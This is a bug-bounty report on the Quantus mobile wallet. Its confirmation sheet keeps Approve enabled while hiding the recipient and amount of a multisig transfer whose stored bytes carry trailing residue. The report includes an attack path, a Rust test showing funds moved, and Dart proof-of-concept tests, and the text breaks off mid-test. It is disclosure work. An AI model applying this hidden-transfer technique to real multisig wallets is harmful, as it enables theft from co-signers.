# 89657 w a high validation gap in multisig confirmation allows approval of hidden transfer arguments

**Submitted on Aug 20th 2026 at 11:56:06 UTC by @v4rvl for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89657
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds

## Description

## Summary

The official mobile wallet successfully reloads a proposal's authoritative bytes from chain storage. If those bytes contain a valid encoded `RuntimeCall` plus trailing residue, the wallet's strict `CallDecoder.decodeBytes` rejects them for semantic display (`quantus_sdk/lib/src/chain/call_decoder.dart:48-59`). The shared confirmation sheet catches that error, omits the authoritative recipient and amount, and keeps Confirm enabled because `_callBytesFailed` records only a storage-load failure (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:183-209,345-407`). The same fail-open gate serves **Approve** and **Execute**.

On **Approve**, the wallet signs the exact loaded byte vector even though it could not display its arguments. On **Execute**, the wallet signs the proposal reference while the runtime dispatches the stored call. For a two-of-two multisig, a malicious member supplies approval one when proposing; the victim's normal approval supplies approval two. The auxiliary pinned-runtime PoC proves that a valid transfer prefix with one trailing byte is stored, byte-bound, approved, dispatched, and moves funds.

This is an app authorization-display defect. The runtime's prefix decoding is a reachability precondition and downstream impact mechanism, not the selected in-scope asset. The attack does not require control of the indexer, RPC, victim key, local network, or victim device. The auxiliary frozen-chain pin supplies the source-pinned runtime precondition.

The unsafe app state is not specific to trailing residue. Any authoritative stored call that loads successfully but cannot be represented by the app's bundled decoder reaches the same transition: semantic display fails while **Approve** and **Execute** remain enabled. The selected trailing-byte vector is the concrete trigger proved against the competition pins. Later chain fix `6f7094f0` removes that trigger, but it does not change the confirmation sheet's fail-open state. Runtime-version skew or a newly introduced call can reach the same state only when a concrete accepted call is shown; this report does not treat future upgrades as an additional proved theft route.

Discovery runs through the indexer, and the shipped query contract is built to retain exactly this row. The `multisig_proposal` schema carries a per-row `decode_error` column selected on every read (`quantus_sdk/lib/src/services/multisig_graphql.dart:193-212`); a producer that discarded undecodable calls would have no row on which to record one. The discovery filters carry no decode predicate, matching on `multisig_id` and `status` alone (`:233-237`) and adding only `proposal_id` for by-ID lookup (`:277-281`). `pallet` and `call` are separate columns populated from the two-byte call index, which is intact in a valid prefix plus residue, so the producer never needs to complete a decode. The production consumer then constructs the proposal when the decoder returns null (`quantus_sdk/lib/src/models/multisig_proposal.dart:97-139`).

The processor source is not public, so this report asserts what that contract proves rather than the producer's runtime behavior, and covers the alternative outright. If the processor drops the row, the same valid on-chain proposal becomes invisible to every signer using the official app, including the notification-by-ID route, because both proposal-list and proposal-by-ID flows query GraphQL before loading chain bytes. The report claims no theft on that branch and discloses it as a separate official-app visibility and liveness defect.

Canonical transfer bytes provide the negative control: they show recipient and amount. A safe failure mode would either show the complete authoritative bytes or disable approval and execution when authoritative semantics cannot be rendered.

## Root cause

The in-scope root cause is that `MultisigActionConfirmSheet` treats a successful storage read as sufficient to enable confirmation even after the authoritative semantic decoder throws. `_decodedProposalCall` catches the exception and falls back to indexer-derived display data, while `blocked` includes only submission state, byte-loading state, and byte-load failure. It does not include semantic decode failure. The affected sites are `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:183-209,345-407` and `quantus_sdk/lib/src/chain/call_decoder.dart:48-59`.

Non-reliance statement: the exploit does not rely on hostile infrastructure, leaked credentials, program inaction, or an elevated program role. The attacker must be an intended multisig member, but remains below threshold and cannot authorize the transfer without inducing a second member's normal wallet action.

Absent this bug, the theft does not occur because canonical bytes display the recipient and amount, while an undecodable authoritative call would either display the complete raw bytes or disable confirmation (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:183-209,353-362`).

## Technical details

The app first does the security-sensitive part correctly: the approval and execution sheets load `ProposalData.call` from chain storage through `fetchProposalCallBytes` (`mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart:38-53`; `mobile-app/lib/v2/screens/multisig/multisig_execute_confirm_sheet.dart:32-42`; `quantus_sdk/lib/src/services/multisig_service.dart:397-448`). Indexer `call_raw` is not the approval signing input.

The fail-open transition happens after that successful read. `CallDecoder.decodeBytes` throws when `remainingLength` is nonzero (`quantus_sdk/lib/src/chain/call_decoder.dart:48-59`). The shared sheet catches the exception and tries `proposal.decodedCall` (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:183-209`). That model path uses the same strict decoder for indexer `callRaw`. If it also fails, the sheet builds a fieldless fallback from indexer pallet, call, amount, and recipient. It shows neither the complete authoritative raw bytes nor exact argument fields decoded from those bytes.

Confirm remains available because `blocked` includes only submission state, byte-loading state, and byte-load failure. It does not include semantic decode failure (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:345-407`). The approval path passes the loaded vector unchanged to `buildApproveCall` (`mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart:38-53`; `quantus_sdk/lib/src/services/multisig_service.dart:415-448`). The execute sheet uses the same display and gating component, although its signed runtime call contains the multisig address and proposal ID rather than the inner bytes.

The external runtime precondition is a parser disagreement. At auxiliary frozen-chain pin `3b243b870a5442a6e5f443056f67bbba87d472f5`, `multisig.propose` prefix-decodes the call without checking that all input was consumed, stores the original vector, and `multisig.execute` repeats the prefix decode before dispatch (`pallets/multisig/src/lib.rs:594-600,677-683,1123-1156`). `multisig.approve` separately requires byte-for-byte equality with the stored vector at lines 779-781. The executed pallet PoC proves this behavior and exact balance movement at that competition pin. Later fix `6f7094f0679c89dbb80b575ec63531357c9d763e` adds canonical round-trip validation and is not an ancestor of the frozen pin.

The app's GraphQL query requests `call_raw` and `decode_error` (`quantus_sdk/lib/src/services/multisig_graphql.dart:193-209`), and `MultisigProposal.fromIndexerJson` constructs a proposal even when strict call decoding returns null (`quantus_sdk/lib/src/models/multisig_proposal.dart:97-139`). It reads `transfer_amount` and `transferTo` independently of semantic call decoding. The SDK test proves consumer capability with a constructed production-shaped response.

Discovery still precedes the authoritative chain read. `getOpenProposals` calls `_fetchProposals` over GraphQL and only then overlays chain bytes (`quantus_sdk/lib/src/services/multisig_service.dart:225-325`). The push-notification route calls `getProposal`, which also queries GraphQL before `_withOnChainCallData` (`multisig_service.dart:269-287`; `mobile-app/lib/v2/screens/multisig/multisig_proposal_detail_sheet.dart:72-90`). A missing row renders **Proposal not found** and never constructs the approval sheet. The passing retain-versus-drop boundary test uses the real pinned `MultisigService`: retained returns one undecodable active proposal, while dropped returns an empty list.

## Attack path

{% stepper %}
{% step %}

## The attacker and victim are signers of a two-of-two multisig that holds victim funds.

{% endstep %}

{% step %}

## The attacker encodes `Balances.transfer_keep_alive(attacker, amount)` and appends one byte, for example `0xff`.

{% endstep %}

{% step %}

## The attacker calls the real `multisig.propose` entrypoint.

Prefix decoding succeeds, the pallet stores every byte, and the attacker receives the first approval.
{% endstep %}

{% step %}

## Processor branch A, retained row

The proposal appears in the wallet, and the wallet fetches the authoritative stored bytes successfully. Continue with the following steps.
{% endstep %}

{% step %}

## Processor branch B, dropped row

List and notification-by-ID routes return no proposal, so the valid on-chain proposal is invisible in the official app. The Critical theft sequence stops, but the official-app visibility defect is established.
{% endstep %}

{% step %}

## Strict display decoding rejects the trailing byte.

The wallet hides the recipient and amount but keeps **Approve** enabled.
{% endstep %}

{% step %}

## The victim follows the normal multisig workflow and approves after seeing only the call name.

{% endstep %}

{% step %}

## The approval contains the exact non-canonical stored bytes.

The pallet accepts it and marks the proposal approved.
{% endstep %}

{% step %}

## The attacker calls `multisig.execute`.

The pallet prefix-decodes the malicious transfer and dispatches it as the multisig account.
{% endstep %}

{% step %}

## The attacker's balance increases, and the victim multisig's balance decreases by the same amount.

{% endstep %}
{% endstepper %}

## Precondition-Reachability

The attacker needs no program, guardian, operator, or Technical Collective role. They do need one intended multisig member key. That member can choose proposal bytes and provide approval one but remains below threshold. The victim's interaction is the expected multisig approval flow covered by the selected malicious connected-wallet interaction impact.

The remaining external condition is row retention by the indexer, and three independent properties of the shipped query contract show the system is built to retain exactly this row.

First, the indexer schema carries a per-row `decode_error` column, selected on every `multisig_proposal` read at `quantus_sdk/lib/src/services/multisig_graphql.dart:193-212`. A producer that discarded undecodable calls would have no row on which to record a decode error. The column exists because rows whose call does not decode are an expected persisted state.

Second, the discovery filter contains no decode predicate. Open-proposal lookup filters on `multisig_id` and `status` alone at `quantus_sdk/lib/src/services/multisig_graphql.dart:233-237`, and by-ID lookup adds only `proposal_id` at `:277-281`. Nothing in the read path can exclude a row for failing to decode.

Third, `pallet`, `call`, `call_raw`, and `transfer_amount` are separate selected columns rather than projections of one decoded object. The pallet and call names derive from the two-byte call index, which is intact in a valid prefix plus residue, so the producer populates the row without completing a decode.

The consumer is written for precisely that row. `MultisigProposal.fromIndexerJson` at `quantus_sdk/lib/src/models/multisig_proposal.dart:97-139` constructs the proposal when `_decodeCall` returns null, consulting the decoder only as a fallback for an absent `transfer_amount`. The SDK PoC asserts this directly.

The private processor source is not public, so this report does not assert its runtime behavior. It states what the shipped query contract, schema, and consumer prove: retention is the designed path, and a drop would require producer behavior that contradicts the `decode_error` column the same service selects. On the drop branch the proposal remains live on chain but is absent from both official-app discovery responses, because list and by-ID lookup return GraphQL rows before any chain-byte overlay (`quantus_sdk/lib/src/services/multisig_service.dart:225-325,269-290`). Both branches are defects and both are covered below.

## Reachability Trace

Entrypoint: the victim opens an active proposal and invokes the production approve sheet at `mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart:20-49`.

Dispatch site: the sheet passes the loaded bytes to `MultisigService.buildApproveCall`, and `submitApproveExtrinsic` signs that call at `quantus_sdk/lib/src/services/multisig_service.dart:415-448`. `SubstrateService.submitExtrinsic` builds and broadcasts the signed extrinsic through `author_submitExtrinsic` at `quantus_sdk/lib/src/services/substrate_service.dart:114-123,179-188`.

Default configuration: the audit-pin app declares its RPC and GraphQL endpoint lists at `quantus_sdk/lib/src/constants/app_constants.dart:14-20`. No feature flag disables the multisig approve path.

## Configuration/Deployment Preconditions

The source-proven default configuration names the Planck RPC and GraphQL endpoints at `quantus_sdk/lib/src/constants/app_constants.dart:14-20`. The app's configured query requests `call_raw` and `decode_error` at `quantus_sdk/lib/src/services/multisig_graphql.dart:193-209`, and the production consumer model accepts that response shape at `quantus_sdk/lib/src/models/multisig_proposal.dart:97-139`.

The frozen competition chain pin `3b243b870a5442a6e5f443056f67bbba87d472f5` contains PR #647's public acknowledgement but predates the canonical-call fix, so the exact downstream balance impact exists in that frozen source topology. The executed pallet PoC proves prefix decoding, original-byte retention, exact approval binding, dispatch, and balance deltas at that pin. Fix merge `6f7094f0` is later and is not an ancestor of the pin. The report exposes both possible private-processor branches and makes no claim about public-network runtime state.

## Downstream Consumer Trace

The in-scope app consumer reads authoritative storage bytes into `MultisigActionConfirmSheet` at `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:158-209`, where display decoding fails but approval stays enabled. The approval builder preserves the exact bytes at `quantus_sdk/lib/src/services/multisig_service.dart:415-448`. Outside the selected app asset, the producer stores attacker-chosen bytes at `pallets/multisig/src/lib.rs:594-600,677-683`; the pallet then accepts the victim approval at lines 779-805 and dispatches the prefix-decoded call at lines 1123-1156. No downstream revalidation requires complete SCALE consumption before the final asset impact.

## Originality / Duplicate Review

Originality status: the mobile authorization defect is an eligible public-fix bypass under the stated eligibility rule.

The relevant public history belongs to `Quantus-Network/quantus-apps` PR #575, not chain PR #575:

* Topic commit `65b318821a74d75073a5e6ec40465163a179009e` rejects trailing bytes for semantic display and shows the complete authoritative call as raw hex when decoding fails.
* Topic merge `d8987e0c1b97ddeebf575cf54f57aa3a3265a5c9` keeps strict decoding and exact stored-byte approval but removes the raw-byte fallback. Neither topic commit is an ancestor of the audit pin.
* Squash commit `997ab8b2a16a18887f84ef286cc47c2f6ac0de75` is the apps PR #575 commit that is an ancestor of pin `d5fc4d6572ebc2244e95009a33f5da5048935867`. Its relevant behavior matches `d8987e0c`: the confirmation sheet's `blocked` condition excludes semantic decode failure (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:183-209,353-362`).
* `Quantus-Network/chain` PR #575 is the unrelated `runtime update doc added` change.
* Chain PR #622 adds exact stored-call byte binding. It prevents approval of different bytes, but the wallet still permits confirmation after semantic decoding rejects those exact bytes.
* Chain PR #647 was created at `2026-08-07T08:42:47Z`, closed and merged at `2026-08-08T07:56:39Z`, and its merge `dbe640b7` is an ancestor of the frozen chain pin. Its public V12 table lists finding 181354 as `Accepting noncanonical call payloads causes execution-event mismatch` with an `invalid-finding` disposition (`prior_audits/Public-V12-Round-Finding-Tables-2026-08-15.txt:576`). The title publicly discloses the chain input and outcome class.
* Chain topic commit `a86becfa`, dated 2026-08-13, and squash/merge `6f7094f0`, also dated 2026-08-13, establish an exact collision. Their text states that `valid_call.encode() ++ trailing_bytes` passes SCALE prefix decoding, and test `propose_rejects_valid_call_with_trailing_bytes` verifies rejection before state changes. `6f7094f0` is not an ancestor of frozen chain pin `3b243b87`; it is present on the inspected current main/release refs.

The public M3 work overlaps materially, but the exact pinned path bypasses its intended raw-review protection. PR #549 addresses a proposal verification failure and prescribes on-chain byte reload plus approval blocking. Here that reload succeeds. PR #575 topic commit `65b31882` then handles strict semantic rejection by showing the full authoritative raw bytes. Commit `65b31882` and merge `d8987e0c` are not ancestors of the audit pin and have no containing branch in the inspected repository. Squash `997ab8b2` is an ancestor on `audit-comp-ready`, but its pinned confirmation sheet has no raw-hex renderer and blocks only `_submitting`, `_loadingCallBytes`, and `_callBytesFailed` (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:148-174,183-209,353-362`).

The residual authorization vector is strictly stronger than the disclosed chain event-mismatch outcome because an ordinary co-signer can cause the official wallet to approve opaque attacker-chosen transfer arguments and reach an executed victim-balance decrease. The distinct fix is an app code change: restore complete authoritative raw-byte review or include semantic decode failure in the confirmation sheet's blocking state. The chain parser fix at `6f7094f0` and the app confirmation-state fix address different guards (`mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:183-209,353-362`).

The disclosed input class is a valid encoded call with noncanonical trailing bytes. The disclosed chain root cause is SCALE prefix decoding without complete-consumption or canonical round-trip validation. The distinct mobile root cause is the merge-created split between byte-load success and semantic-verification failure. The distinct authorization state is `_callBytesFailed == false` while decoding has thrown, raw review is absent, and **Approve** or **Execute** remains enabled. PR #647 and `6f7094f0` do not identify or repair that mobile state. Apps topic commit `65b31882` intended to preserve raw review, but that mitigation does not survive the merge.

## Proof of Concept

The primary app PoC is `poc-tests/mobile-app/test/security/multisig_trailing_bytes_wysiwys_test.dart`, included in the attached archive. It pumps the real `MultisigActionConfirmSheet` twice:

* Negative control: canonical transfer bytes render `Destination` and `Amount`.
* Attack state: the same bytes plus `0x00` load successfully, strict display decoding fails, neither argument appears, and the real **Approve** button remains enabled with a non-null callback.

`poc-tests/quantus_sdk/test/security/multisig_trailing_bytes_differential_test.dart` adds the production decoder and call-builder checks. It proves that the wallet rejects the residue for display and that `buildApproveCall` embeds the exact same byte vector. Its indexer-shaped test is a consumer fixture only and does not establish private-processor retention.

### Auxiliary downstream impact PoC

The following test runs beside the sibling pinned pallet's existing tests. That chain repository is not the selected asset. The test proves the external prefix-decode precondition and resulting balance impact using the real `create_multisig`, `propose`, `approve`, and `execute` entrypoints. It also checks the byte-equality defense and exact before/after balances.

```rust
#[test]
fn trailing_bytes_transfer_is_stored_approved_and_executed() {
	new_test_ext().execute_with(|| {
		System::set_block_number(1);

		let signers = vec![alice(), bob()];
		let threshold = 2;
		assert_ok!(Multisig::create_multisig(
			RuntimeOrigin::signed(alice()),
			signers.clone(),
			threshold,
			0,
		));
		let multisig_address =
			Multisig::derive_multisig_address(&signers, threshold, 0);

		<pallet_balances::Pallet<Test> as Mutate<_>>::mint_into(
			&multisig_address,
			50_000,
		)
		.unwrap();
		let recipient_balance_before = Balances::free_balance(dave());
		let multisig_balance_before = Balances::free_balance(&multisig_address);

		let transfer_call =
			RuntimeCall::Balances(pallet_balances::Call::transfer_keep_alive {
				dest: dave(),
				value: 1_000,
			});
		let mut submitted_bytes = transfer_call.encode();
		submitted_bytes.push(0xff);
		let submitted_call: crate::BoundedCallOf<Test> =
			submitted_bytes.clone().try_into().unwrap();

		assert_ok!(Multisig::propose(
			RuntimeOrigin::signed(alice()),
			multisig_address.clone(),
			submitted_call,
			100,
		));
		let proposal_id = get_last_proposal_id(&multisig_address);
		assert_eq!(stored_call(&multisig_address, proposal_id).to_vec(), submitted_bytes);

		let mut mismatched_bytes = submitted_bytes.clone();
		*mismatched_bytes.last_mut().unwrap() = 0x00;
		assert_err_ignore_postinfo!(
			Multisig::approve(
				RuntimeOrigin::signed(bob()),
				multisig_address.clone(),
				proposal_id,
				mismatched_bytes.try_into().unwrap(),
			),
			Error::<Test>::CallMismatch,
		);

		assert_ok!(Multisig::approve(
			RuntimeOrigin::signed(bob()),
			multisig_address.clone(),
			proposal_id,
			stored_call(&multisig_address, proposal_id),
		));
		assert_eq!(
			Proposals::<Test>::get(&multisig_address, proposal_id)
				.unwrap()
				.status,
			ProposalStatus::Approved,
		);

		assert_ok!(Multisig::execute(
			RuntimeOrigin::signed(bob()),
			multisig_address.clone(),
			proposal_id,
		));
		assert_eq!(Balances::free_balance(dave()), recipient_balance_before + 1_000);
		assert_eq!(
			Balances::free_balance(&multisig_address),
			multisig_balance_before - 1_000,
		);
		assert!(!Proposals::<Test>::contains_key(&multisig_address, proposal_id));
		System::assert_has_event(
			Event::ProposalExecuted {
				multisig_address,
				proposal_id,
				proposer: alice(),
				call: submitted_bytes,
				approvers: vec![alice(), bob()],
				result: Ok(()),
			}
			.into(),
		);
	});
}
```

Run it at chain pin `3b243b870a5442a6e5f443056f67bbba87d472f5`:

```
cargo test -p pallet-multisig tests::trailing_bytes_transfer_is_stored_approved_and_executed -- --exact --nocapture
```

Result:

```
running 1 test
test tests::trailing_bytes_transfer_is_stored_approved_and_executed ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 56 filtered out
```

Three app-side test files accompany the report:

* `poc-tests/quantus_sdk/test/security/multisig_trailing_bytes_differential_test.dart`: 4 tests pass. The suite proves the canonical display control, the prefix-versus-exact decode split, exact approval bytes, and consumer ingestion of a constructed active `decode_error` row.
* `poc-tests/quantus_sdk/test/security/indexer_trailing_byte_reachability_boundary_test.dart`: 1 test passes. The suite drives the real GraphQL consumer and proves both possible discovery results: a retained row reaches the wallet, while a dropped row does not.
* `poc-tests/mobile-app/test/security/multisig_trailing_bytes_wysiwys_test.dart`: 2 widget tests pass. Canonical bytes show `Destination` and `Amount`; the same bytes plus `0x00` hide both fields while the real **Approve** button remains enabled.

Total executed proof set: 8 tests pass, consisting of 1 pallet test and 7 app tests.

### Inline SDK differential and approval-byte PoC

```dart
import 'dart:typed_data';

import 'package:convert/convert.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:polkadart/scale_codec.dart';
import 'package:quantus_sdk/generated/planck/pallets/balances.dart' as balances_pallet;
import 'package:quantus_sdk/generated/planck/types/pallet_multisig/pallet/call.dart' as multisig_call;
import 'package:quantus_sdk/generated/planck/types/quantus_runtime/runtime_call.dart' as runtime;
import 'package:quantus_sdk/generated/planck/types/sp_runtime/multiaddress/multi_address.dart' as multi_address;
import 'package:quantus_sdk/src/chain/call_decoder.dart';
import 'package:quantus_sdk/src/models/multisig_account.dart';
import 'package:quantus_sdk/src/models/multisig_proposal.dart';
import 'package:quantus_sdk/src/services/multisig_service.dart';

void main() {
  final attacker = Uint8List.fromList(List<int>.filled(32, 0xbb));
  final transfer = const balances_pallet.Txs().transferAllowDeath(
    dest: multi_address.MultiAddress.values.id(attacker),
    value: BigInt.from(42) * BigInt.from(1000000000000),
  );
  final canonical = transfer.encode();
  final smuggled = <int>[...canonical, 0x00];

  test('negative control: canonical call is displayed with destination and amount', () {
    final decoded = CallDecoder.decodeBytes(canonical);

    expect(decoded.pallet, 'Balances');
    expect(decoded.call, 'transfer_allow_death');
    expect(decoded.summary?.amount, BigInt.from(42) * BigInt.from(1000000000000));
    expect(decoded.summary?.recipient, isNotNull);
    expect(decoded.fields, isNotEmpty);
  });

  test('valid prefix plus residue is chain-decodable but app-undisplayable', () {
    // This is the same prefix-only codec operation used by the pinned pallet's
    // propose and execute entrypoints. SCALE Decode succeeds and leaves residue.
    final input = Input.fromBytes(Uint8List.fromList(smuggled));
    final chainDecoded = runtime.RuntimeCall.codec.decode(input);

    expect(chainDecoded, equals(transfer));
    expect(input.remainingLength, 1);

    // The wallet's signing display applies an exact-fit rule to the same bytes.
    expect(
      () => CallDecoder.decodeBytes(smuggled),
      throwsA(isA<FormatException>().having((error) => error.message, 'message', contains('trailing bytes'))),
    );
  });

  test('real approve builder signs the exact undisplayable byte vector', () {
    const multisigAddress = 'qznvdbDy9rPMBEBpimXYsEvY38Gx7XeCa7rWRQ9hveaZemr8U';
    const memberAddress = 'qzoK1UVQSssYHuTWxAN1U8egoJWRjTzF1LBcRubYp5a19ium3';
    final account = MultisigAccount(
      name: 'PoC multisig',
      accountId: multisigAddress,
      signers: const [memberAddress],
      threshold: 1,
      nonce: BigInt.zero,
      myMemberAccountId: memberAddress,
    );

    final built = MultisigService().buildApproveCall(msig: account, proposalId: 7, call: smuggled);
    final approve = built.value0 as multisig_call.Approve;

    expect(approve.proposalId, 7);
    expect(approve.call, orderedEquals(smuggled));
  });

  test('consumer model retains an undecodable proposal row', () {
    const multisigAddress = 'qznvdbDy9rPMBEBpimXYsEvY38Gx7XeCa7rWRQ9hveaZemr8U';
    const memberAddress = 'qzoK1UVQSssYHuTWxAN1U8egoJWRjTzF1LBcRubYp5a19ium3';
    final account = MultisigAccount(
      name: 'PoC multisig',
      accountId: multisigAddress,
      signers: const [memberAddress],
      threshold: 1,
      nonce: BigInt.zero,
      myMemberAccountId: memberAddress,
    );
    final proposal = MultisigProposal.fromIndexerJson({
      'id': '$multisigAddress-7',
      'proposal_id': 7,
      'created_at': '2026-08-20T00:00:00.000Z',
      'updated_at': '2026-08-20T00:00:00.000Z',
      'pallet': 'Balances',
      'call': 'transfer_allow_death',
      'call_raw': '0x${hex.encode(smuggled)}',
      'transfer_amount': '0',
      'status': 'ACTIVE',
      'expiry_block': 1000,
      'deposit': '0',
      'approvals': [memberAddress],
      'decode_error': 'Trailing bytes after RuntimeCall',
      'proposer': {'id': memberAddress},
      'transferTo': null,
    }, msig: account);

    expect(proposal.callRaw, orderedEquals(smuggled));
    expect(proposal.decodeError, 'Trailing bytes after RuntimeCall');
    expect(proposal.decodedCall, isNull);
    expect(proposal.recipient, isEmpty);
    expect(proposal.amount, BigInt.zero);
    expect(proposal.isOpen, isTrue);
  });
}
```

### Inline retain-versus-drop discovery boundary PoC

```dart
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:convert/convert.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/generated/planck/pallets/balances.dart' as balances_pallet;
import 'package:quantus_sdk/generated/planck/types/sp_runtime/multiaddress/multi_address.dart' as multi_address;
import 'package:quantus_sdk/src/models/multisig_account.dart';
import 'package:quantus_sdk/src/services/multisig_service.dart';
import 'package:quantus_sdk/src/services/network/redundant_endpoint.dart';

void main() {
  test('local loopback producer isolates malformed-row retention boundary', () async {
    const multisigAddress = 'qznvdbDy9rPMBEBpimXYsEvY38Gx7XeCa7rWRQ9hveaZemr8U';
    const memberAddress = 'qzoK1UVQSssYHuTWxAN1U8egoJWRjTzF1LBcRubYp5a19ium3';
    final account = MultisigAccount(
      name: 'PoC multisig',
      accountId: multisigAddress,
      signers: const [memberAddress],
      threshold: 1,
      nonce: BigInt.zero,
      myMemberAccountId: memberAddress,
    );

    final attacker = Uint8List.fromList(List<int>.filled(32, 0xbb));
    final canonical = const balances_pallet.Txs()
        .transferAllowDeath(
          dest: multi_address.MultiAddress.values.id(attacker),
          value: BigInt.from(42) * BigInt.from(1000000000000),
        )
        .encode();
    final smuggled = <int>[...canonical, 0x00];

    var retainRow = true;
    var requestCount = 0;
    final server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
    server.listen((request) async {
      requestCount++;
      final body = jsonDecode(await utf8.decoder.bind(request).join()) as Map<String, dynamic>;
      final query = body['query'] as String;
      final variables = body['variables'] as Map<String, dynamic>;

      expect(query, contains('{status: {_in: [ACTIVE, APPROVED]}}'));
      expect(query, contains('call_raw'));
      expect(query, contains('decode_error'));
      expect(variables, {'multisigId': multisigAddress});

      final rows = retainRow
          ? [
              {
                'id': '$multisigAddress-7',
                'proposal_id': 7,
                'created_at': '2026-08-20T00:00:00.000Z',
                'updated_at': '2026-08-20T00:00:00.000Z',
                'pallet': 'Balances',
                'call': 'transfer_allow_death',
                'call_raw': '0x${hex.encode(smuggled)}',
                'transfer_amount': '0',
                'status': 'ACTIVE',
                'expiry_block': 1000,
                'deposit': '0',
                'approvals': [memberAddress],
                'decode_error': 'Trailing bytes after RuntimeCall',
                'proposer': {'id': memberAddress},
                'transferTo': null,
              },
            ]
          : <Map<String, dynamic>>[];

      request.response.headers.contentType = ContentType.json;
      request.response.write(
        jsonEncode({
          'data': {'multisig_proposal': rows},
        }),
      );
      await request.response.close();
    });

    final graphQlEndpoints = GraphQlEndpointService().endpoints;
    final rpcEndpoints = RpcEndpointService().endpoints;
    final originalGraphQlEndpoints = List<Endpoint>.from(graphQlEndpoints);
    final originalRpcEndpoints = List<Endpoint>.from(rpcEndpoints);

    try {
      graphQlEndpoints
        ..clear()
        ..add(Endpoint(url: 'http://${server.address.address}:${server.port}/v1/graphql'));
      // An empty RPC endpoint list makes the production consumer skip its
      // optional chain overlay. This replay tests the GraphQL discovery hop.
      rpcEndpoints.clear();

      final retained = await MultisigService().getOpenProposals(account);
      expect(retained, hasLength(1));
      expect(retained.single.callRaw, orderedEquals(smuggled));
      expect(retained.single.decodeError, 'Trailing bytes after RuntimeCall');
      expect(retained.single.decodedCall, isNull);
      expect(retained.single.isOpen, isTrue);

      retainRow = false;
      final dropped = await MultisigService().getOpenProposals(account);
      expect(dropped, isEmpty);
      expect(requestCount, 2);
    } finally {
      graphQlEndpoints
        ..clear()
        ..addAll(originalGraphQlEndpoints);
      rpcEndpoints
        ..clear()
        ..addAll(originalRpcEndpoints);
      await server.close(force: true);
    }
  });
}
```

### Inline mobile confirmation-sheet PoC

```dart
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_riverpod/misc.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:quantus_sdk/generated/planck/pallets/balances.dart' as balances_pallet;
import 'package:quantus_sdk/generated/planck/types/sp_runtime/multiaddress/multi_address.dart' as multi_address;
import 'package:resonance_network_wallet/l10n/app_localizations.dart';
import 'package:resonance_network_wallet/providers/currency_display_provider.dart';
import 'package:resonance_network_wallet/providers/l10n_provider.dart';
import 'package:resonance_network_wallet/providers/wallet_providers.dart';
import 'package:resonance_network_wallet/services/exchange_rate_service.dart';
import 'package:resonance_network_wallet/v2/components/decoded_call_view.dart';
import 'package:resonance_network_wallet/v2/components/quantus_button.dart';
import 'package:resonance_network_wallet/v2/screens/multisig/multisig_action_confirm_sheet.dart';
import 'package:resonance_network_wallet/v2/theme/app_theme.dart';

extension _PoCApp on WidgetTester {
  Future<void> pumpApp(Widget widget, {List<Override>? overrides}) async {
    await pumpWidget(
      ProviderScope(
        overrides: overrides ?? [],
        child: Builder(
          builder: (context) => MaterialApp(
            theme: AppTheme.darkTheme(context),
            darkTheme: AppTheme.darkTheme(context),
            themeMode: ThemeMode.dark,
            home: widget,
          ),
        ),
      ),
    );
  }
}

class _FakeSettingsService extends /* not a production dependency */ Fake implements SettingsService {
  @override
  Future<DisplayAccount?> getActiveAccount() async => null;

  @override
  Future<List<MultisigAccount>> getMultisigAccounts() async => [];

  @override
  String? getSelectedAppLocale() => 'en';

  @override
  String? getSelectedFiatCurrency() => null;

  @override
  bool isBalanceHidden() => false;

  @override
  bool isCurrencyFlipped() => false;

  @override
  bool isPosModeEnabled() => false;
}

void main() {
  const multisigAddress = 'qznvdbDy9rPMBEBpimXYsEvY38Gx7XeCa7rWRQ9hveaZemr8U';
  const memberAddress = 'qzoK1UVQSssYHuTWxAN1U8egoJWRjTzF1LBcRubYp5a19ium3';
  final attackerId = Uint8List.fromList(List<int>.filled(32, 0xbb));
  final transfer = const balances_pallet.Txs().transferAllowDeath(
    dest: multi_address.MultiAddress.values.id(attackerId),
    value: BigInt.from(42) * BigInt.from(1000000000000),
  );
  final smuggled = <int>[...transfer.encode(), 0x00];
  final signer = Account(
    walletIndex: 0,
    index: 0,
    name: 'Victim signer',
    accountId: memberAddress,
    accountType: AccountType.local,
  );
  final multisig = MultisigAccount(
    name: 'Two of two',
    accountId: multisigAddress,
    signers: const [memberAddress],
    threshold: 1,
    nonce: BigInt.zero,
    myMemberAccountId: memberAddress,
  );

  MultisigProposal proposal({required List<int> callBytes}) => MultisigProposal(
    entityId: 'proposal-7',
    id: 7,
    multisigAddress: multisigAddress,
    proposer: memberAddress,
    createdAt: DateTime.utc(2026, 8, 20),
    updatedAt: DateTime.utc(2026, 8, 20),
    pallet: 'Balances',
    call: 'transfer_allow_death',
    recipient: '',
    amount: BigInt.zero,
    callRaw: Uint8List.fromList(callBytes),
    expiryBlock: 1000,
    approvals: const [],
    deposit: BigInt.zero,
    status: MultisigProposalStatus.active,
    threshold: 1,
    signerCount: 1,
    decodeError: callBytes.length == transfer.encode().length ? null : 'Trailing bytes after RuntimeCall',
  );

